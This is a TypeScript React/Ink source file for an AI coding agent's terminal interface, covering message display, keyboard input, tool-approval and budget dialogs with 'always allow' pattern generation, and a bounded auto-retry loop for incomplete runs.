/**
 * TUI Application Component
 *
 * Extracted from main.ts with all anti-flicker patterns preserved:
 * - <Static> component for messages (render once, never re-render)
 * - Single useInput hook in MemoizedInputArea (no competing hooks)
 * - Ref-based callbacks (prevents useInput re-subscription)
 * - Custom memo comparator (only re-render on visual prop changes)
 */

import { useState, useCallback, useEffect, memo, useRef, useMemo } from 'react';
import { Box, Text, useApp, useInput, Static } from 'ink';
import { ActiveAgentsPanel, type ActiveAgent } from './components/ActiveAgentsPanel.js';
import { TasksPanel } from './components/TasksPanel.js';
import { SwarmStatusPanel } from './components/SwarmStatusPanel.js';
import type { SwarmStatus } from '../integrations/swarm/types.js';
import { type ToolCallDisplayItem as ImportedToolCallDisplayItem } from './components/ToolCallItem.js';
import { DebugPanel, useDebugBuffer } from './components/DebugPanel.js';
import { DiagnosticsPanel } from './components/DiagnosticsPanel.js';
import { runTypeCheck, getASTCacheStats } from '../integrations/index.js';
import { estimateTokenCount } from '../integrations/utilities/token-estimate.js';
import { StatusBar } from './components/StatusBar.js';
import { ToolCallsPanel } from './components/ToolCallsPanel.js';
import { TransparencyPanel } from './components/TransparencyPanel.js';
import { useAgentEvents } from './hooks/use-agent-events.js';
import { useMessagePruning } from './hooks/useMessagePruning.js';
import type { Task } from '../integrations/tasks/task-manager.js';
import type { ProductionAgent } from '../agent.js';
import type { SQLiteStore } from '../integrations/persistence/sqlite-store.js';
import type { MCPClient } from '../integrations/mcp/mcp-client.js';
import type { Compactor } from '../integrations/context/compaction.js';
import type { ThemeColors, CommandPaletteItem } from './types.js';
import { getTheme, getThemeNames } from './theme/index.js';
import { ControlledCommandPalette } from './input/CommandPalette.js';
import { ApprovalDialog } from './components/ApprovalDialog.js';
import { BudgetExtensionDialog } from './components/BudgetExtensionDialog.js';
import { LearningValidationDialog, type ProposedLearning } from './components/LearningValidationDialog.js';
import { PlanPanel, type ActivePlan } from './components/PlanPanel.js';
import type { TUIApprovalBridge, TUIBudgetExtensionBridge, TUILearningValidationBridge } from '../adapters.js';
import type { ExtensionRequest } from '../integrations/budget/economics.js';
import type { ApprovalRequest as TypesApprovalRequest } from '../types.js';
import type { TransparencyState } from './transparency-aggregator.js';
import { handleSkillsCommand } from '../commands/skills-commands.js';
import { handleAgentsCommand } from '../commands/agents-commands.js';
import { handleInitCommand } from '../commands/init-commands.js';
import type { CommandOutput } from '../commands/types.js';
import { createHistoryManager, type HistoryManager } from '../integrations/persistence/history.js';
import type { AgentResult } from '../types.js';

// Module-level constant for DiagnosticsPanel fallback (prevents new object each render)
const EMPTY_DIAGNOSTICS: { lastTscResult: null; recentSyntaxErrors: { file: string; line: number; message: string }[] } = {
  lastTscResult: null,
  recentSyntaxErrors: [],
};

// =============================================================================
// PATTERN GENERATION FOR ALWAYS-ALLOW
// =============================================================================

/**
 * Generates an approval pattern for matching future requests.
 * Pattern format: `tool:key_argument`
 *
 * Matching strategy by tool type:
 * - bash: match on base command (first 2 tokens, e.g., "npm test")
 * - file operations: match on file path
 * - other tools: match on first string argument
 */
function generateApprovalPattern(request: TypesApprovalRequest): string {
  const tool = request.tool || request.action || 'unknown';
  const args = request.args || {};

  // Tool-specific key extraction
  if (tool === 'bash' && typeof args.command === 'string') {
    // Extract base command only: "npm test --coverage" → "npm"
    // Using just the first token prevents pattern fragmentation (e.g., "sed -i" vs "sed 's/...'")
    // Safety: high/critical risk commands are blocked from auto-approve via risk guard
    const parts = args.command.trim().split(/\s+/);
    const baseCmd = parts[0]; // Base command only: "sed", "npm", "git", etc.
    return `bash:${baseCmd}`;
  }

  if (['write_file', 'edit_file', 'read_file'].includes(tool)) {
    const path = (args.path || args.file_path || '') as string;
    // For write/edit: use directory-level patterns so "Always" covers the whole subtree
    // e.g. write_file:src/api/ instead of write_file:src/api/routes.ts
    if ((tool === 'write_file' || tool === 'edit_file') && path.includes('/')) {
      const dir = path.substring(0, path.lastIndexOf('/') + 1);
      return `${tool}:${dir}`;
    }
    return `${tool}:${path}`;
  }

  // Default: tool + first string argument
  const firstStringArg = Object.values(args).find((v) => typeof v === 'string') as
    | string
    | undefined;
  return `${tool}:${firstStringArg || ''}`;
}

// =============================================================================
// TYPES
// =============================================================================

/** Props for the main TUI application */
export interface TUIAppProps {
  agent: ProductionAgent;
  sessionStore: SQLiteStore;
  mcpClient: MCPClient;
  compactor: Compactor;
  lspManager: { cleanup: () => Promise<void>; getActiveServers: () => string[] };
  theme: string;
  model: string;
  gitBranch: string;
  currentSessionId: string;
  formatSessionsTable: (sessions: any[]) => string;
  saveCheckpointToStore: (store: any, data: any) => void;
  loadSessionState: (store: any, id: string) => Promise<any>;
  persistenceDebug: {
    isEnabled: () => boolean;
    log: (message: string, data?: any) => void;
    error: (message: string, error?: any) => void;
  };
  /** Approval bridge for TUI permission dialogs (optional) */
  approvalBridge?: TUIApprovalBridge;
  /** Budget extension bridge for economics extension requests (optional) */
  budgetExtensionBridge?: TUIBudgetExtensionBridge;
  /** Learning validation bridge for proposed learning approval (optional) */
  learningValidationBridge?: TUILearningValidationBridge;
}

/** TUI message display format */
interface TUIMessage {
  id: string;
  role: string;
  content: string;
  ts: Date;
}

function buildAutoLoopPrompt(
  details: string | undefined,
  promptStyle: 'strict' | 'concise',
  reason?: string,
  openTasks?: { pending: number; inProgress: number; blocked: number },
): string {
  // For open_tasks / budget_limit: the agent ran out of budget but has pending tasks
  if (reason === 'open_tasks' || reason === 'budget_limit') {
    const taskSummary = openTasks
      ? `Open tasks: ${openTasks.pending} pending, ${openTasks.inProgress} in_progress, ${openTasks.blocked} blocked.`
      : '';
    return [
      '[System] Previous run ended with incomplete tasks due to budget limits.',
      taskSummary,
      'Continue working on the remaining tasks. Pick up the next available task and execute it.',
      details ? `Context: ${details}` : '',
    ]
      .filter(Boolean)
      .join('\n');
  }

  if (promptStyle === 'concise') {
    return `[System] Continue now and execute required actions immediately. Avoid future-intent phrasing. ${details ? `Context: ${details}` : ''}`.trim();
  }
  return [
    '[System] Previous run ended as incomplete because the response described pending work.',
    'Continue from current state and execute the remaining action now with tools if needed.',
    'Do not describe what you will do next. Either perform the action or provide a final completion statement.',
    details ? `Context: ${details}` : '',
  ]
    .filter(Boolean)
    .join('\n');
}

export interface AutoLoopAgent {
  run: (task: string) => Promise<AgentResult>;
  getResilienceConfig?: () => unknown;
}

export async function runWithIncompleteAutoLoop(
  agent: AutoLoopAgent,
  task: string,
  callbacks?: { onRetry?: (attempt: number, maxAttempts: number) => void },
): Promise<{
  result: AgentResult;
  autoLoopRuns: number;
  reasonChain: string[];
  maxIncompleteAutoLoops: number;
}> {
  const resilienceCfgRaw = agent.getResilienceConfig?.();
  const resilienceCfg =
    resilienceCfgRaw && typeof resilienceCfgRaw === 'object'
      ? (resilienceCfgRaw as {
          incompleteActionAutoLoop?: boolean;
          maxIncompleteAutoLoops?: number;
          autoLoopPromptStyle?: 'strict' | 'concise';
        })
      : {};
  const incompleteAutoLoop = resilienceCfg.incompleteActionAutoLoop ?? true;
  const maxIncompleteAutoLoops = resilienceCfg.maxIncompleteAutoLoops ?? 2;
  const promptStyle = resilienceCfg.autoLoopPromptStyle ?? 'strict';

  let result = await agent.run(task);
  const reasonChain: string[] = [result.completion.reason];
  let autoLoopRuns = 0;

  const isRetryableReason = (reason: string) =>
    reason === 'future_intent' ||
    reason === 'incomplete_action' ||
    reason === 'open_tasks' ||
    reason === 'budget_limit';

  while (
    !result.success &&
    incompleteAutoLoop &&
    isRetryableReason(result.completion.reason) &&
    autoLoopRuns < maxIncompleteAutoLoops
  ) {
    autoLoopRuns++;
    callbacks?.onRetry?.(autoLoopRuns, maxIncompleteAutoLoops);
    const recoveryPrompt = buildAutoLoopPrompt(
      result.completion.details,
      promptStyle,
      result.completion.reason,
      result.completion.openTasks,
    );
    result = await agent.run(recoveryPrompt);
    reasonChain.push(result.completion.reason);
  }

  result = {
    ...result,
    completion: {
      ...result.completion,
      recovery: {
        intraRunRetries: result.completion.recovery?.intraRunRetries ?? 0,
        autoLoopRuns,
        terminal: !result.success,
        reasonChain,
      },
    },
  };

  return { result, autoLoopRuns, reasonChain, maxIncompleteAutoLoops };
}

// ToolCallDisplayItem is imported from ./components/ToolCallItem.js
// Re-export type alias for local usage
type ToolCallDisplayItem = ImportedToolCallDisplayItem;

// =============================================================================
// MEMOIZED MESSAGE ITEM
// Prevents re-render when parent state changes
// =============================================================================

interface MessageItemProps {
  msg: TUIMessage;
  colors: ThemeColors;
}

const MessageItem = memo(function MessageItem({ msg, colors }: MessageItemProps) {
  const isUser = msg.role === 'user';
  const isAssistant = msg.role === 'assistant';
  const isError = msg.role === 'error';
  const icon = isUser ? '>' : isAssistant ? '<>' : isError ? 'x' : '*';
  const roleColor = isUser ? '#87CEEB' : isAssistant ? '#98FB98' : isError ? '#FF6B6B' : '#FFD700';
  const label = isUser ? 'You' : isAssistant ? 'Assistant' : isError ? 'Error' : 'System';

  return (
    <Box marginBottom={1} flexDirection="column">
      <Box gap={1}>
        <Text color={roleColor} bold>
          {icon}
        </Text>
        <Text color={roleColor} bold>
          {label}
        </Text>
        <Text color={colors.textMuted} dimColor>
          {` ${msg.ts.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' })}`}
        </Text>
      </Box>
      <Box marginLeft={2}>
        <Text wrap="wrap" color={isError ? colors.error : colors.text}>
          {msg.content}
        </Text>
      </Box>
    </Box>
  );
});

// ToolCallItem is imported from ./components/ToolCallItem.js
// It handles diff rendering, subagent-prefixed names, and result stringification

// =============================================================================
// MEMOIZED INPUT AREA
// Manages own state to prevent parent re-renders
// Handles ALL keyboard input to prevent multiple useInput hooks
// =============================================================================

interface MemoizedInputAreaProps {
  onSubmit: (value: string) => void;
  disabled: boolean;
  borderColor: string;
  textColor: string;
  cursorColor: string;
  onCtrlC?: () => void;
  onCtrlL?: () => void;
  onCtrlP?: () => void;
  onEscape?: () => void;
  onToggleToolExpand?: () => void;
  onToggleThinking?: () => void;
  onToggleTransparency?: () => void;
  onToggleActiveAgents?: () => void;
  onToggleTasks?: () => void;
  onToggleDebug?: () => void;
  onToggleSwarm?: () => void;
  onToggleDiagnostics?: () => void;
  onPageUp?: () => void;
  onPageDown?: () => void;
  onHome?: () => void;
  onEnd?: () => void;
  // Command palette state (controlled from parent)
  commandPaletteOpen?: boolean;
  onCommandPaletteInput?: (input: string, key: any) => void;
  // Approval dialog state (controlled from parent)
  approvalDialogOpen?: boolean;
  approvalDenyReasonMode?: boolean;
  onApprovalApprove?: () => void;
  onApprovalAlwaysAllow?: () => void;
  onApprovalDeny?: (reason?: string) => void;
  onApprovalDenyWithReason?: () => void;
  onApprovalCancelDenyReason?: () => void;
  onApprovalDenyReasonInput?: (input: string, key: any) => void;
  // Budget extension dialog state (controlled from parent)
  budgetExtensionDialogOpen?: boolean;
  onBudgetExtensionApprove?: () => void;
  onBudgetExtensionDeny?: () => void;
  // Learning validation dialog state (controlled from parent)
  learningValidationDialogOpen?: boolean;
  onLearningApprove?: () => void;
  onLearningReject?: () => void;
  onLearningSkip?: () => void;
  // History support
  history?: string[];
  onHistorySearch?: (query: string) => string[];
}

const MemoizedInputArea = memo(
  function MemoizedInputArea({
    onSubmit,
    disabled,
    borderColor,
    textColor,
    cursorColor,
    onCtrlC,
    onCtrlL,
    onCtrlP,
    onEscape,
    onToggleToolExpand,
    onToggleThinking,
    onToggleTransparency,
    onToggleActiveAgents,
    onToggleTasks,
    onToggleDebug,
    onToggleSwarm,
    onToggleDiagnostics,
    onPageUp,
    onPageDown,
    onHome,
    onEnd,
    commandPaletteOpen,
    onCommandPaletteInput,
    approvalDialogOpen,
    approvalDenyReasonMode,
    onApprovalApprove,
    onApprovalAlwaysAllow,
    onApprovalDeny,
    onApprovalDenyWithReason,
    onApprovalCancelDenyReason,
    onApprovalDenyReasonInput,
    budgetExtensionDialogOpen,
    onBudgetExtensionApprove,
    onBudgetExtensionDeny,
    learningValidationDialogOpen,
    onLearningApprove,
    onLearningReject,
    onLearningSkip,
    history = [],
    onHistorySearch,
  }: MemoizedInputAreaProps) {
    const [value, setValue] = useState('');
    const [cursorPos, setCursorPos] = useState(0);

    // History navigation state
    const [historyIndex, setHistoryIndex] = useState(-1); // -1 = current input (not browsing history)
    const [savedInput, setSavedInput] = useState(''); // Preserve current input when browsing
    const historyRef = useRef(history);
    historyRef.current = history;

    // Store callbacks in refs so useInput doesn't re-subscribe on prop changes
    const callbacksRef = useRef({
      onSubmit,
      onCtrlC,
      onCtrlL,
      onCtrlP,
      onEscape,
      onToggleToolExpand,
      onToggleThinking,
      onToggleTransparency,
      onToggleActiveAgents,
      onToggleTasks,
      onToggleDebug,
      onToggleSwarm,
      onToggleDiagnostics,
      onPageUp,
      onPageDown,
      onHome,
      onEnd,
      commandPaletteOpen,
      onCommandPaletteInput,
      approvalDialogOpen,
      approvalDenyReasonMode,
      onApprovalApprove,
      onApprovalAlwaysAllow,
      onApprovalDeny,
      onApprovalDenyWithReason,
      onApprovalCancelDenyReason,
      onApprovalDenyReasonInput,
      budgetExtensionDialogOpen,
      onBudgetExtensionApprove,
      onBudgetExtensionDeny,
      learningValidationDialogOpen,
      onLearningApprove,
      onLearningReject,
      onLearningSkip,
      onHistorySearch,
    });
    callbacksRef.current = {
      onSubmit,
      onCtrlC,
      onCtrlL,
      onCtrlP,
      onEscape,
      onToggleToolExpand,
      onToggleThinking,
      onToggleTransparency,
      onToggleActiveAgents,
      onToggleTasks,
      onToggleDebug,
      onToggleSwarm,
      onToggleDiagnostics,
      onPageUp,
      onPageDown,
      onHome,
      onEnd,
      commandPaletteOpen,
      onCommandPaletteInput,
      approvalDialogOpen,
      approvalDenyReasonMode,
      onApprovalApprove,
      onApprovalAlwaysAllow,
      onApprovalDeny,
      onApprovalDenyWithReason,
      onApprovalCancelDenyReason,
      onApprovalDenyReasonInput,
      budgetExtensionDialogOpen,
      onBudgetExtensionApprove,
      onBudgetExtensionDeny,
      learningValidationDialogOpen,
      onLearningApprove,
      onLearningReject,
      onLearningSkip,
      onHistorySearch,
    };
    const disabledRef = useRef(disabled);
    disabledRef.current = disabled;

    useInput((input, key) => {
      const cb = callbacksRef.current;

      // Global shortcuts (always active)
      if (key.ctrl && input === 'c') {
        cb.onCtrlC?.();
        return;
      }
      if (key.ctrl && input === 'l') {
        cb.onCtrlL?.();
        return;
      }
      if (key.ctrl && input === 'p') {
        cb.onCtrlP?.();
        return;
      }
      if (key.escape) {
        cb.onEscape?.();
        return;
      }
      // Alt+T / Option+T
      if (input === '\u2020' || (key.meta && input === 't')) {
        cb.onToggleToolExpand?.();
        return;
      }
      // Alt+O / Option+O
      if (input === '\u00f8' || (key.meta && input === 'o')) {
        cb.onToggleThinking?.();
        return;
      }
      // Alt+I / Option+I - Toggle transparency panel
      if (input === '\u00ee' || input === '\u0131' || (key.meta && input === 'i')) {
        cb.onToggleTransparency?.();
        return;
      }
      // Alt+A / Option+A - Toggle active agents panel
      if (input === '\u00e5' || (key.meta && input === 'a')) {
        cb.onToggleActiveAgents?.();
        return;
      }
      // Alt+K / Option+K - Toggle tasks panel
      if (input === '\u02da' || (key.meta && input === 'k')) {
        cb.onToggleTasks?.();
        return;
      }
      // Alt+D / Option+D - Toggle debug panel
      if (input === '\u2202' || (key.meta && input === 'd')) {
        cb.onToggleDebug?.();
        return;
      }
      // Alt+W / Option+W - Toggle swarm panel
      if (input === '\u2211' || (key.meta && input === 'w')) {
        cb.onToggleSwarm?.();
        return;
      }
      // Alt+Y / Option+Y - Toggle diagnostics panel
      if (input === '\u00a5' || (key.meta && input === 'y')) {
        cb.onToggleDiagnostics?.();
        return;
      }

      // Command palette keyboard handling (when open)
      if (cb.commandPaletteOpen && cb.onCommandPaletteInput) {
        cb.onCommandPaletteInput(input, key);
        return;
      }

      // Approval dialog keyboard handling (when open)
      if (cb.approvalDialogOpen) {
        // If in deny reason mode, handle text input
        if (cb.approvalDenyReasonMode && cb.onApprovalDenyReasonInput) {
          // Escape cancels deny reason mode
          if (key.escape) {
            cb.onApprovalCancelDenyReason?.();
            return;
          }
          // Enter submits the deny reason
          if (key.return) {
            cb.onApprovalDenyReasonInput(input, key);
            return;
          }
          // Regular input for deny reason
          cb.onApprovalDenyReasonInput(input, key);
          return;
        }

        // Standard approval dialog shortcuts
        if (input === 'y' || input === 'Y') {
          cb.onApprovalApprove?.();
          return;
        }
        if (input === 'a' || input === 'A') {
          cb.onApprovalAlwaysAllow?.();
          return;
        }
        if (input === 'n' || input === 'N') {
          cb.onApprovalDeny?.();
          return;
        }
        if (input === 'd' || input === 'D') {
          cb.onApprovalDenyWithReason?.();
          return;
        }
        // Block other input while approval dialog is open
        return;
      }

      // Budget extension dialog keyboard handling (when open)
      if (cb.budgetExtensionDialogOpen) {
        if (input === 'y' || input === 'Y') {
          cb.onBudgetExtensionApprove?.();
          return;
        }
        if (input === 'n' || input === 'N') {
          cb.onBudgetExtensionDeny?.();
          return;
        }
        // Block other input while dialog is open
        return;
      }

      // Learning validation dialog keyboard handling (when open)
      if (cb.learningValidationDialogOpen) {
        if (input === 'y' || input === 'Y') {
          cb.onLearningApprove?.();
          return;
        }
        if (input === 'n' || input === 'N') {
          cb.onLearningReject?.();
          return;
        }
        if (input === 's' || input === 'S') {
          cb.onLearningSkip?.();
          return;
        }
        // Block other input while dialog is open
        return;
      }

      // Scroll navigation
      if (key.pageUp) {
        cb.onPageUp?.();
        return;
      }
      if (key.pageDown) {
        cb.onPageDown?.();
        return;
      }
      if (key.ctrl && key.upArrow) {
        cb.onHome?.();
        return;
      }
      if (key.ctrl && key.downArrow) {
        cb.onEnd?.();
        return;
      }

      // Input handling (only when not disabled)
      if (disabledRef.current) return;

      // Shift+Enter for multiline input (insert newline)
      if (key.return && key.shift) {
        setValue((v) => v.slice(0, cursorPos) + '\n' + v.slice(cursorPos));
        setCursorPos((p) => p + 1);
        return;
      }

      if (key.return && value.trim()) {
        cb.onSubmit(value);
        setValue('');
        setCursorPos(0);
        setHistoryIndex(-1); // Reset history navigation
        setSavedInput('');
        return;
      }

      if (key.backspace || key.delete) {
        if (cursorPos > 0) {
          setValue((v) => v.slice(0, cursorPos - 1) + v.slice(cursorPos));
          setCursorPos((p) => p - 1);
        }
        return;
      }

      if (key.leftArrow) {
        setCursorPos((p) => Math.max(0, p - 1));
        return;
      }
      if (key.rightArrow) {
        setCursorPos((p) => Math.min(value.length, p + 1));
        return;
      }

      // History navigation with up/down arrows
      if (key.upArrow && historyRef.current.length > 0) {
        setHistoryIndex((prevIndex) => {
          const maxIndex = historyRef.current.length - 1;
          if (prevIndex === -1) {
            // First press - save current input and go to most recent history
            setSavedInput(value);
            const newValue = historyRef.current[maxIndex] || '';
            setValue(newValue);
            setCursorPos(newValue.length);
            return maxIndex;
          } else if (prevIndex > 0) {
            // Go to older entry
            const newIndex = prevIndex - 1;
            const newValue = historyRef.current[newIndex] || '';
            setValue(newValue);
            setCursorPos(newValue.length);
            return newIndex;
          }
          return prevIndex; // Already at oldest
        });
        return;
      }
      if (key.downArrow && historyRef.current.length > 0) {
        setHistoryIndex((prevIndex) => {
          if (prevIndex === -1) {
            // Not browsing history, do nothing
            return -1;
          } else if (prevIndex < historyRef.current.length - 1) {
            // Go to newer entry
            const newIndex = prevIndex + 1;
            const newValue = historyRef.current[newIndex] || '';
            setValue(newValue);
            setCursorPos(newValue.length);
            return newIndex;
          } else {
            // At most recent - restore saved input
            setValue(savedInput);
            setCursorPos(savedInput.length);
            setSavedInput('');
            return -1;
          }
        });
        return;
      }

      if (key.ctrl && input === 'a') {
        setCursorPos(0);
        return;
      }
      if (key.ctrl && input === 'e') {
        setCursorPos(value.length);
        return;
      }
      if (key.ctrl && input === 'u') {
        setValue('');
        setCursorPos(0);
        return;
      }

      if (input && !key.ctrl && !key.meta) {
        setValue((v) => v.slice(0, cursorPos) + input + v.slice(cursorPos));
        setCursorPos((p) => p + input.length);
      }
    });

    // Check if multiline (for visual indicator)
    const isMultiline = value.includes('\n');
    const lineCount = value.split('\n').length;

    return (
      <Box
        borderStyle="round"
        borderColor={disabledRef.current ? '#666' : borderColor}
        paddingX={1}
        flexDirection="column"
      >
        <Box>
          <Text color={textColor} bold>
            {isMultiline ? '»' : '>'}{' '}
          </Text>
          <Text>{value.slice(0, cursorPos).replace(/\n/g, '⏎')}</Text>
          {!disabled && (
            <Text backgroundColor={cursorColor} color="#1a1a2e">
              {value[cursorPos] === '\n' ? '⏎' : (value[cursorPos] ?? ' ')}
            </Text>
          )}
          <Text>{value.slice(cursorPos + 1).replace(/\n/g, '⏎')}</Text>
          {isMultiline && (
            <Text color="#666" dimColor>
              {' '}
              ({lineCount} lines)
            </Text>
          )}
        </Box>
      </Box>
    );
  },
  (prevProps, nextProps) => {
    // Custom comparison: only re-render if visual props change
    return (
      prevProps.disabled === nextProps.disabled &&
      prevProps.borderColor === nextProps.borderColor &&
      prevProps.textColor === nextProps.textColor &&
      prevProps.cursorColor === nextProps.cursorColor &&
      prevProps.commandPaletteOpen === nextProps.commandPaletteOpen &&
      prevProps.approvalDialogOpen === nextProps.approvalDialogOpen &&
      prevProps.approvalDenyReasonMode === nextProps.approvalDenyReasonMode &&
      prevProps.budgetExtensionDialogOpen === nextProps.budgetExtensionDialogOpen &&
      prevProps.learningValidationDialogOpen === nextProps.learningValidationDialogOpen
    );
  },
);

// =============================================================================
// MAIN TUI APP COMPONENT
// =============================================================================

export function TUIApp({
  agent,
  sessionStore,
  mcpClient,
  compactor,
  lspManager,
  theme,
  model,
  gitBranch,
  currentSessionId,
  formatSessionsTable,
  saveCheckpointToStore,
  persistenceDebug,
  approvalBridge,
  budgetExtensionBridge,
  learningValidationBridge,
}: TUIAppProps) {
  const { exit } = useApp();
  const [messages, setMessages] = useState<TUIMessage[]>([]);
  const [isProcessing, setIsProcessing] = useState(false);
  const initialModeInfo = agent.getModeInfo();
  const initialMode = initialModeInfo.name === 'Plan' ? 'ready (plan)' : 'ready';
  const [status, setStatus] = useState({ iter: 0, tokens: 0, cost: 0, mode: initialMode });

  // Quantized status for StatusBar — only produces a new reference when values
  // cross meaningful thresholds (cost >$0.001, tokens >5k). This makes the memo
  // comparator in StatusBar effective: React skips calling it entirely when the
  // useMemo reference is stable.
  const statusForBar = useMemo(() => ({
    iter: status.iter,
    mode: status.mode,
    cost: Math.round(status.cost * 1000) / 1000,
    tokens: Math.round(status.tokens / 5000) * 5000,
  }), [status.iter, status.mode,
    // eslint-disable-next-line react-hooks/exhaustive-deps
    Math.round(status.cost * 1000),
    // eslint-disable-next-line react-hooks/exhaustive-deps
    Math.round(status.tokens / 5000)]);

  // Throttled mode-only setter for handleAgentEvent — rapid mode transitions
  // (thinking→calling X→thinking) collapse into the latest value instead of
  // triggering 5-7 renders per LLM iteration
  const statusModeTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const pendingStatusRef = useRef<((s: typeof status) => typeof status) | null>(null);
  const lastStatusModeUpdateRef = useRef(0);
  const STATUS_MODE_THROTTLE_MS = 150;

  const setStatusThrottled = useCallback(
    (updater: (s: { iter: number; tokens: number; cost: number; mode: string }) => { iter: number; tokens: number; cost: number; mode: string }) => {
      const now = Date.now();
      const elapsed = now - lastStatusModeUpdateRef.current;

      if (elapsed >= STATUS_MODE_THROTTLE_MS) {
        lastStatusModeUpdateRef.current = now;
        setStatus(updater);
        pendingStatusRef.current = null;
      } else {
        pendingStatusRef.current = updater;
        if (!statusModeTimerRef.current) {
          statusModeTimerRef.current = setTimeout(() => {
            statusModeTimerRef.current = null;
            if (pendingStatusRef.current) {
              lastStatusModeUpdateRef.current = Date.now();
              setStatus(pendingStatusRef.current);
              pendingStatusRef.current = null;
            }
          }, STATUS_MODE_THROTTLE_MS - elapsed);
        }
      }
    },
    [],
  );

  // Flush any pending throttled status update immediately (used on tool.complete
  // to keep StatusBar in sync with ToolCallsPanel within the same render frame)
  const flushStatusThrottle = useCallback(() => {
    if (statusModeTimerRef.current) {
      clearTimeout(statusModeTimerRef.current);
      statusModeTimerRef.current = null;
    }
    if (pendingStatusRef.current) {
      lastStatusModeUpdateRef.current = Date.now();
      setStatus(pendingStatusRef.current);
      pendingStatusRef.current = null;
    }
  }, []);

  // Cleanup throttle timer
  useEffect(() => {
    return () => {
      if (statusModeTimerRef.current) clearTimeout(statusModeTimerRef.current);
    };
  }, []);
  const [toolCalls, setToolCalls] = useState<ToolCallDisplayItem[]>([]);
  const [currentThemeName, setCurrentThemeName] = useState<string>(theme);
  // contextTokens, budgetPct, elapsedTime are now colocated in StatusBar component

  // Command history manager (persistent)
  const historyManagerRef = useRef<HistoryManager | null>(null);
  if (!historyManagerRef.current) {
    historyManagerRef.current = createHistoryManager();
  }
  const [historyEntries, setHistoryEntries] = useState<string[]>(
    () => historyManagerRef.current?.getHistory() || [],
  );

  // Debug buffer for debug panel
  const debugBuffer = useDebugBuffer(100);

  // Execution mode to prevent duplicate event handling
  // 'idle' = no active execution, 'processing' = handleSubmit running,
  // 'approving' = /approve running, 'draining' = brief post-run event drain
  type ExecutionMode = 'idle' | 'processing' | 'approving' | 'draining';
  const [executionMode, setExecutionMode] = useState<ExecutionMode>('idle');
  const executionModeRef = useRef<ExecutionMode>('idle');
  const executionDrainTimerRef = useRef<NodeJS.Timeout | null>(null);

  // Display toggles
  const [toolCallsExpanded, setToolCallsExpanded] = useState(false);
  const [showThinking, setShowThinking] = useState(true);
  const [transparencyExpanded, setTransparencyExpanded] = useState(false);
  const [activeAgentsExpanded, setActiveAgentsExpanded] = useState(true);
  const [tasksExpanded, setTasksExpanded] = useState(true);
  const [debugExpanded, setDebugExpanded] = useState(false);
  const [swarmExpanded, setSwarmExpanded] = useState(true);
  const [diagExpanded, setDiagExpanded] = useState(false);

  // Refs for values used inside handleAgentEvent — prevents subscription churn
  // when user toggles these display settings
  const showThinkingRef = useRef(showThinking);
  showThinkingRef.current = showThinking;
  const debugExpandedRef = useRef(debugExpanded);
  debugExpandedRef.current = debugExpanded;

  // Swarm status tracking (for Swarm Status Panel)
  const [swarmStatus, setSwarmStatus] = useState<SwarmStatus | null>(null);

  // Active agents tracking (for Active Agents Panel)
  const [activeAgents, setActiveAgents] = useState<ActiveAgent[]>([]);

  // Tasks tracking (for Tasks Panel)
  const [tasks, setTasks] = useState<Task[]>([]);

  // Command palette state
  const [commandPaletteOpen, setCommandPaletteOpen] = useState(false);
  const [commandPaletteQuery, setCommandPaletteQuery] = useState('');
  const [commandPaletteIndex, setCommandPaletteIndex] = useState(0);

  // Approval dialog state
  const [pendingApproval, setPendingApproval] = useState<TypesApprovalRequest | null>(null);
  const [denyReasonMode, setDenyReasonMode] = useState(false);
  const [denyReason, setDenyReason] = useState('');

  // Session-scoped always-allowed patterns (e.g., "bash:npm test", "write_file:/path")
  const [alwaysAllowed, setAlwaysAllowed] = useState<Set<string>>(new Set());

  // Budget extension dialog state
  const [pendingBudgetExtension, setPendingBudgetExtension] = useState<ExtensionRequest | null>(null);

  // Learning validation dialog state
  const [pendingLearning, setPendingLearning] = useState<ProposedLearning | null>(null);

  // Interactive plan display state
  const [activePlan, setActivePlan] = useState<ActivePlan | null>(null);
  const [planExpanded, setPlanExpanded] = useState(true);

  // Transparency state
  const [transparencyState, setTransparencyState] = useState<TransparencyState | null>(null);

  // Consecutive Ctrl+C tracking for force exit
  const [ctrlCCount, setCtrlCCount] = useState(0);
  const ctrlCTimerRef = useRef<NodeJS.Timeout | null>(null);

  // Refs for stable callbacks
  const isProcessingRef = useRef(isProcessing);
  const messagesLengthRef = useRef(messages.length);
  const pendingApprovalRef = useRef(pendingApproval);
  isProcessingRef.current = isProcessing;
  messagesLengthRef.current = messages.length;
  pendingApprovalRef.current = pendingApproval;
  const pendingBudgetExtensionRef = useRef(pendingBudgetExtension);
  pendingBudgetExtensionRef.current = pendingBudgetExtension;
  const pendingLearningRef = useRef(pendingLearning);
  pendingLearningRef.current = pendingLearning;

  // Memoize the approval request object to avoid defeating ApprovalDialog's memo
  const approvalRequest = useMemo(() => pendingApproval ? {
    id: pendingApproval.id,
    tool: pendingApproval.tool || pendingApproval.action,
    args: pendingApproval.args || {},
    risk: pendingApproval.risk,
    context: pendingApproval.context,
  } : null, [pendingApproval]);

  const finishExecutionMode = useCallback(() => {
    if (executionDrainTimerRef.current) {
      clearTimeout(executionDrainTimerRef.current);
      executionDrainTimerRef.current = null;
    }
    executionModeRef.current = 'draining';
    setExecutionMode('draining');
    executionDrainTimerRef.current = setTimeout(() => {
      executionModeRef.current = 'idle';
      setExecutionMode('idle');
      executionDrainTimerRef.current = null;
    }, 400);
  }, []);

  // Derive theme and colors (memoized so children relying on reference equality don't break)
  const selectedTheme = getTheme(currentThemeName);
  const colors = useMemo(() => selectedTheme.colors, [currentThemeName]);

  const { pruneIfNeeded } = useMessagePruning({ maxMessages: 500, preserveRecent: 400 });

  const messageIdCounter = useRef(0);
  const addMessage = useCallback((role: string, content: string) => {
    const uniqueId = `${role}-${Date.now()}-${++messageIdCounter.current}`;
    setMessages((prev) =>
      pruneIfNeeded([...prev, { id: uniqueId, role, content, ts: new Date() }]),
    );
  }, [pruneIfNeeded]);

  const persistPendingPlanToStore = useCallback(() => {
    if (!agent.hasPendingPlan()) return;
    if (
      !('savePendingPlan' in sessionStore) ||
      typeof sessionStore.savePendingPlan !== 'function'
    ) {
      return;
    }

    const pendingPlan = agent.getPendingPlan();
    if (!pendingPlan) return;

    sessionStore.savePendingPlan(pendingPlan, currentSessionId);
    persistenceDebug.log('Pending plan saved', {
      planId: pendingPlan.id,
      changes: pendingPlan.proposedChanges.length,
      sessionId: currentSessionId,
    });
  }, [agent, sessionStore, currentSessionId, persistenceDebug]);

  // =========================================================================
  // APPROVAL DIALOG HANDLERS
  // =========================================================================

